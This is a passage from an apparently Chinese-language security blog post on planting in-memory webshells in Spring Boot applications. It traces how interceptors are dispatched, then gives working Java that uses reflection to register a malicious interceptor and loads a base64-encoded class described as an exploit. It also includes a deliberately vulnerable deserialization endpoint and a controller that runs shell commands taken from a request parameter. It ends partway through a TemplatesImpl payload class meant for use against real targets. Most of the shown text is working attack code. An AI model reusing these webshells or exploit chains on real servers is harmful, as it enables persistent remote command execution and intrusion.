class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后再进行添加注册</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.configure;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>()).addPathPatterns(<span class="hljs-string">&quot;/hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113202533221.png" alt="image-20241113202533221"></p><h2 id="interceptor流程"><a href="#Interceptor流程" class="headerlink" title="Interceptor流程"></a>Interceptor流程</h2><p>emmm我本身打算配置类处打个断点分析interceptor的注册流程，但是看文章都是从处理请求的流程来分析的，估计是如果要动态注册的话我们应该是走不到配置类的手动addInterceptor的地方吗🤔</p><p>先按着网上的思路来吧，这个点到时有空的话研究一下🫡</p><p>那就直接在preHandle下个断点</p><p><img src="https://cdn.clown2024.cn/image-20241113213033793.png" alt="image-20241113213033793"></p><p>然后看看调用栈，其中在DispatcherServlet#doDispatch方法里面看到了处理我们PreHandle方法的地方</p><p><img src="https://cdn.clown2024.cn/image-20241113213305476.png" alt="image-20241113213305476"></p><p>这个applyPreHandle方法很明显就是处理我们PreHandle的方法，从返回值也可以推出，因为我们PreHandle返回的也是布尔值</p><p>从图中的变量值可以看到我们的interceptor就在这个mappedHandler变量当中</p><p><img src="https://cdn.clown2024.cn/image-20241113213755407.png" alt="image-20241113213755407"></p><p>那就看看这个mappedHandler是怎么生成的</p><p><img src="https://cdn.clown2024.cn/image-20241113213924826.png" alt="image-20241113213924826"></p><p>在doDispatch方法前面有一个getHandler方法，然后传入一个RequestFacade实例processedRequest，这个processedRequest是前面checkMultipart方法检查一下，该方法主要判断request是否为文件上传请求，不是的话则会原样返回</p><p>跟进去getHandler</p><p><img src="https://cdn.clown2024.cn/image-20241113214501797.png" alt="image-20241113214501797"></p><p>然后就是遍历每一个HandlerMapping，然后从中取得HandlerExecutionChain实例，如果能找到请求对应的Handler就返回，继续跟进，调用了AbstractHandlerMapping#getHandler方法</p><p><img src="https://cdn.clown2024.cn/image-20241113215756803.png" alt="image-20241113215756803"></p><p>这里首先获得一个handler，然后调用getHandlerExecutionChain返回了一个HandlerExecutionChain实例executionChain，看看这个方法</p><p><img src="https://cdn.clown2024.cn/image-20241113215627045.png" alt="image-20241113215627045"></p><p>里面显示new了一个HandlerExecutionChain，然后遍历adaptedInterceptors里的interceptor添加进去他的interceptorList里面</p><p><img src="https://cdn.clown2024.cn/image-20241113215958004.png" alt="image-20241113215958004"></p><p>interceptor有如下的这三种</p><p><img src="https://cdn.clown2024.cn/image-20241113220049185.png" alt="image-20241113220049185"></p><p>再往下他就直接返回了这个executionChain</p><p><img src="https://cdn.clown2024.cn/image-20241113220218053.png" alt="image-20241113220218053"></p><p>然后返回的handler也是这个</p><p><img src="https://cdn.clown2024.cn/image-20241113220259687.png" alt="image-20241113220259687"></p><p>然后最终执行就是我们前面说的那个applyPreHandle方法</p><p><img src="https://cdn.clown2024.cn/image-20241113220624107.png" alt="image-20241113220624107"></p><p>里面遍历了每个interprector然后进行调用</p><p>那现在我们就知道应该在哪里插入我们的interceptor了</p><h2 id="内存马实现"><a href="#内存马实现-1" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>根据前面的分析所有的interceptor是存在adaptedInterceptors里面，这个属性在org.springframework.web.servlet.handler.AbstractHandlerMapping里面</p><p><img src="https://cdn.clown2024.cn/image-20241113221751279.png" alt="image-20241113221751279"></p><p>所以思路就是反射获取到这个变量，然后添加我们自己的恶意interceptor即可</p><p>编写的interceptor还是用我们一开始的那个TestInterceptor，现在先不把他加入配置，我们等会手动加入</p><p>然后编写内存马代码的步骤</p><ul><li>首先获取应用的上下文环境，也就是<code>ApplicationContext</code></li><li>然后从 <code>ApplicationContext</code> 中获取 <code>AbstractHandlerMapping</code> 实例（用于反射），也有文章直接获取RequestMappingHandlerMapping也可以，下面写的就是用的这个</li><li>反射获取 <code>AbstractHandlerMapping</code>类的 <code>adaptedInterceptors</code>字段</li><li>通过 <code>adaptedInterceptors</code>注册拦截器</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">TestInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>();<br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们访问interceptor这个路由就会成功注册我们的interceptor</p><p><img src="https://cdn.clown2024.cn/image-20241113224259546.png" alt="image-20241113224259546"></p><p><img src="https://cdn.clown2024.cn/image-20241113224312450.png" alt="image-20241113224312450"></p><p>这里的实现也可以改一下，改成前面Controller的base64的形式，这样就不需要服务器有对应的类了</p><p>修改后的exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + evilInterceptor);<br><span class="hljs-comment">//        TestInterceptor evilInterceptor = new TestInterceptor();</span><br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="实战中反序列化利用内存马"><a href="#实战中反序列化利用内存马" class="headerlink" title="实战中反序列化利用内存马"></a>实战中反序列化利用内存马</h1><p>前面的写法还不能满足实战利用，实战中通常结合反序列化的形式，不过改成实战利用也蛮简单的，就是结合链子比如TemplatesImpl里的恶意类代码就是我们前面所写的的恶意代码</p><p>先写一个简单的反序列化漏洞的路由</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/des&quot;&#125;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;base64Data&quot;)</span> String base64Data)</span> &#123;<br>        System.out.println(base64Data);<br>        <span class="hljs-type">byte</span>[] serializedData = Base64.getMimeDecoder().decode(base64Data);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> deserializeData(serializedData);<br>        <span class="hljs-keyword">return</span> option;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">deserializeData</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serializedData)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>            ois.readObject();<br>            ois.close();<br>            bis.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="反序列化利用controller"><a href="#反序列化利用Controller" class="headerlink" title="反序列化利用Controller"></a>反序列化利用Controller</h2><p>我们要注册的controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是TemplatesImpl恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerBehind</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span 